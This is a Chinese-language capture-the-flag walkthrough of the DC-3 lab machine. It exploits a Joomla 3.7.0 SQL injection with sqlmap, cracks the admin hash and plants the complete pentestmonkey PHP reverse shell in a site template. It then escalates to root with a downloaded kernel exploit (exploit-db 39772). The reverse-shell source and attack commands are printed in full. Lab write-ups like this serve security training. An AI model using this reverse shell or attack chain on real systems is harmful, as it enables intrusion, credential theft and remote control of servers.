DC系列第三台靶机！！！

```table-of-contents
```

常规的主机发现操作就不进行展示了！！！

![](assets/DC-3/file-20260516161108095.png)
首页内容 ---> 有一个提示：
```plain
这次，只有一面旗帜，一个进入点且没有线索。
要得到旗帜，你显然必须获得root权限。
你如何获得root权限取决于你——而且，显然，也取决于系统。
祝你好运——我希望你享受这个小挑战。:-)```
```

看来这一次的目的很明确了，直通root即可能没有其他提示！
（所以通过网页功能进行信息收集的可能性没有那么高！不过也可以尝试一下！）

# 端口扫描

![](assets/DC-3/file-20260516161533053.png)
只有一个TCP端口
看一下UDP端口：
![](assets/DC-3/file-20260516162035059.png)
UDP端口也不多，只有一个`DHCP`（几乎没有利用点）

# 详细信息探测

![](assets/DC-3/file-20260516162220710.png)
`Http`服务没有过多的内容，唯一有的就是生成器`Joomla！`

![](assets/DC-3/file-20260516162410707.png)
看来也是一个CMS

![](assets/DC-3/file-20260516162645481.png)
在Github上搜索一下发现是否是开源的（如果是开源的就很容易搜索到相关的漏洞利用）

# 漏洞探测

尝试进行一下基本的漏洞探测，因为这是开源的CMS，且starts也很多，说明也是很受欢迎的。一般情况对于这些较为热门的系统都有工具或大佬进行了整合的

![](assets/DC-3/file-20260516175934136.png)
已经过了一会儿了，但是还没有探测出来（是卡住了，还是太慢？ --> 不清楚，先让它跑着，去浏览器搜索一下相关的工具与应用）
这里搜索时最重要的不是直接搜索漏洞，而是详细化版本内容信息，这样才能精确定位

![](assets/DC-3/file-20260516180325849.png)
这里貌似有一个扫描项目（包括，版本、目录等信息扫描）
点进去确认一下是否可以利用吧！
![](assets/DC-3/file-20260516180515080.png)
可以的功能很多
先尝试一下这个工具的利用
![](assets/DC-3/file-20260516180622063.png)

![](assets/DC-3/file-20260516180815611.png)

在操作`Joomla Scan`时`nmap`的扫描也结束了，看一下吧！是否是一致的！

![](assets/DC-3/file-20260516181014357.png)

![](assets/DC-3/file-20260516181031014.png)
`nmap`探测出了更加详细的信息：
- **Joomla3.7.0**版本存在一个 `SQL注入` 的漏洞（CVE-2017-8917）
- 还存在**csrf**的漏洞，但是这里是靶机，所以不考虑以利用了
- **Dos attack**也不作为利用点
- **目录枚举**几乎也与`Joomla Scan`一致

# 渗透过程

分析几乎依旧完成，也在前端找了一下看是否有其他可利用的点

![](assets/DC-3/file-20260516181453120.png)
唯一发现有趣的点
尝试解密一下吧！
`aHR0cDovLzE5Mi4xNTYuMTY5LjE0MS8=` 看起来想**base64**编码
![](assets/DC-3/file-20260516181612181.png)
好吧，原来是对**url**进行的编码

`379301a7cbadbab460d1ca31cbe98219` 这个看起来像是 md5
尝试一下吧！
![](assets/DC-3/file-20260516181724325.png)
解不出来呢！！！

看来得先放一放了！！！

搜索一下对于的SQL注入的 CVE（通过版本号也是可以的）
![](assets/DC-3/file-20260516181948446.png)
刚好有一个是关于`SQL注入`的利用，同时版本也对应上了

![](assets/DC-3/file-20260516182058347.png)

详细看一下利用
![](assets/DC-3/file-20260516182217428.png)

看一下是否真的存在**SQL注入**
![](assets/DC-3/file-20260516182306369.png)

![](assets/DC-3/file-20260516182415877.png)
看来的确存在**SQL注入**

直接按照**Poc**进行sqlmap利用

![](assets/DC-3/file-20260516182748621.png)
成功获取到了**数据库名**

继续获取表名
![](assets/DC-3/file-20260516182902889.png)
有点多，但是重要的应该是 `#__users`

继续获取列表名
```bash
sudo sqlmap -u "http://192.156.169.141/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering] 
```

![](assets/DC-3/file-20260516183253698.png)

继续获取详细数据（这里重要的点应该是username、password、name）
![](assets/DC-3/file-20260516183410614.png)
只有一个admin用户以及密码
`$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`
这明显是加密了的，根据前缀`$2y`可以知道这是`bcrypt`类型
不确定就进行验证使用`hashid`或`hash-identifier`

![](assets/DC-3/file-20260516190736465.png)

尝试破解一下是否能获得密码
工具 `john` 或 `hashcat`

![](assets/DC-3/file-20260516191213414.png)

![](assets/DC-3/file-20260516191539328.png)
得到了admin用户的密码

尝试登录！！！
![](assets/DC-3/file-20260516191630065.png)
看来没有问题，接下来就是找到获取shell的立足点

![](assets/DC-3/file-20260516191747720.png)

![](assets/DC-3/file-20260516191821479.png)

![](assets/DC-3/file-20260516191851449.png)

![](assets/DC-3/file-20260516193103944.png)
大致找了一下可能利用的功能是这些
得考虑优先级减少工作用时，大致的优先级为： `Templates` -> `Media` ->  `Modules`
思路为：能直接写入`php`脚本，再进行文件上传，最后进行模组漏洞的探测

先找一下php的反弹shell脚本
![](assets/DC-3/file-20260516193358520.png)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.156.169.128';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```

修改一下**反弹IP地址**与**端口**，并创建一个新的php写入网站
![](assets/DC-3/file-20260516193524061.png)
返回详细地址，尝试**监听**与**访问**

路径为：`http://192.156.169.141/templates/protostar/reverse.php`

![](assets/DC-3/file-20260516193813233.png)
成功反弹

![](assets/DC-3/file-20260516193836559.png)
交互不行，提升一下交互

![](assets/DC-3/file-20260516193916437.png)

进行环境等详细的信息收集，找到root切入点
![](assets/DC-3/file-20260516194019375.png)

![](assets/DC-3/file-20260516194201592.png)

![](assets/DC-3/file-20260516194239152.png)

![](assets/DC-3/file-20260516194256668.png)

![](assets/DC-3/file-20260516194326293.png)
emmm，怎么都没有可以利用点 --- 继续！！！

![](assets/DC-3/file-20260516194735026.png)
查看一下：[https://gtfobins.github.io] 
详细看一下是否存在利用点

emmm，都尝试了一边，要么没法运行，要么就是需要密码（尝试了网站的密码，都不对！）

看来得继续深入了！！！
但接下来的思路是什么？可执行文件，权限等都不行！！！
暂时能想到的应该就是 `内核漏洞` 了吧！

详细查看一下 **内核** 版本信息
![](assets/DC-3/file-20260516195622220.png)

搜索一下
![](assets/DC-3/file-20260516195727261.png)
应该是的，此题的突破点应该就是 `内核漏洞` 

`searchsploit Linux 4.4.0-21`
![](assets/DC-3/file-20260516195902804.png)
这么看，搜索方法有点丑陋。搜索时就知道该内核涉及多个发行版
重新搜索一下
![](assets/DC-3/file-20260516200102009.png)
这样看起来才合理！！！
![](assets/DC-3/file-20260516200148441.png)
大致锁定这几个，但是一一尝试太费时间
进行详细排序思考：
- 两个4.4版本的暂时靠后，优先 `4.4.0` 这种更加详细的版本
- **目标靶机**是*Linux*，排除*Windows*

![](assets/DC-3/file-20260516200501546.png)
`40871.c`：这里使用的 Ubuntu 是 *64位*，而之前探测的内核为 *32位* --> 可以**Pass**

![](assets/DC-3/file-20260516200639417.png)
这个依旧是 *64位* --> **Pass**

![](assets/DC-3/file-20260516200846667.png)
这个貌似是通用的！！！没有具体说明内核位数，先尝试一下吧！！！


![](assets/DC-3/file-20260516201004953.png)
详细利用步骤！！！
一步一步来吧！！！

现在**攻击机**上进行下载解压（避免留下一些痕迹）
```bash
# 攻击机
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip

unzip 39772.zip
cd 39772
tar -xvf *.tar
```

![](assets/DC-3/file-20260516201505850.png)

攻击机通过python开启server服务，使用靶机的`/tmp`目录下载下来
![](assets/DC-3/file-20260516210657326.png)

按照步骤运行即可
![](assets/DC-3/file-20260516221446542.png)

![](assets/DC-3/file-20260516221514852.png)